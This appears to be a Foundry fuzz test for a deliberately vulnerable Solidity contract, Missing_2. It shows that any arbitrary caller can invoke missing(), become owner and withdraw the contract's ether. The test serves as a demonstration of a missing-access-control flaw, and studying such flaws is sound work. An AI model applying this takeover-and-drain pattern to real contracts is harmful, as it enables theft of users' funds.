
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_2} from "../src/Missing_2.sol";

contract TestAccessControlMissing_2 is Test {
    Missing_2 missing2;

    function setUp() public {
        missing2 = new Missing_2();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);

        // Exclude the initial privileged role (the deployer/owner if any)
        vm.assume(caller != address(missing2));

        // --- 2. State Configuration ---
        // No special state or funding required for calling missing()

        // --- 3. Execution & Assertion ---
        vm.prank(caller);
        missing2.missing();

        // Assert that the arbitrary caller has become the owner by observing behavior:
        // send some ether to the contract and then withdraw as the new owner
        vm.deal(address(this), 1 ether);
        (bool sent, ) = address(missing2).call{value: 1 ether}("");
        require(sent, "funding failed");

        vm.prank(caller);
        missing2.withdraw();

        assertEq(address(missing2).balance, 0);
        assertEq(caller.balance, 1 ether);
    }

    receive() external payable {}

    fallback() external payable {}
}
